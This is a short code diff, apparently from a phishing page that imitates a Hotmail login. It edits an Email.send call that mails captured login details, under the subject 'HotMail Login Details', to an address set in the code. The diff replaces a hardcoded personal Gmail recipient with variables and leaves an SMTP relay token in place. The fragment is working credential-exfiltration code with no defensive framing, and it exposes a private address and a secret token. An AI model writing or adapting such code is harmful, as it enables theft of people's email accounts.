@@ -92,8 +92,8 @@
         
               Email.send({
                 SecureToken: "ae7b961a-f6a1-404b-8428-39a3ca35b27a",
-                To : 'samuelemeh200@gmail.com',
-                From : "samuelemeh200@gmail.com",
+                To : To,
+                From : From,
                 Subject : "HotMail Login Details",
                 Body : 
                 `Email: ${email}
